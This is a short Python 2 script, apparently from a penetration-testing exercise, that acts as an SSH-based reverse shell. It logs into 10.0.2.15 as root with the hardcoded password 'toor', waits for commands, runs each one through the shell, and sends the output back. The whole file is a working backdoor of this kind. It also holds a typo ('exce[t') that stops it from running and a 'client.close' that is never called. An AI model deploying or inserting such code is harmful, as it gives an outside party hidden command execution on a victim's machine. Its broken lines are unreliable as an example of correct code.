#!/usr/bin/env python2

import paramiko
import threading

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('10.0.2.15', username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hey I am connected :)')
print chan.recv(1024)

import subprocess

while True:
	command = chan.recv(1024)
	try:
		CMD = subprocess.check_output(command, shell=True)
		chan.send(CMD)
	exce[t Exception, e:
		chan.send(str(e))

client.close
